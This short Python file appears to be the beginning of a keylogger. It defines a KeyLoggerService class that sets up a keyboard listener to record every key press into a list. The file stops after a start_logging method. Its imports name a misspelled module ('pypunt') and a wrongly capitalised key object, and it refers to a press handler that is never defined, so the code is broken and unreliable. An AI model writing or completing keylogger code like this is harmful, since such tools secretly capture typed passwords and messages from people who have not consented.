from IKeylogger import IKeyLogger
from pypunt import KEY, Listener

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.data = []
        self.listener = Listener(on_press=self.__on_press)
    
    #The listener start to listen to everey press keybord
    def start_logging(self):
        self.listener.start()
    

        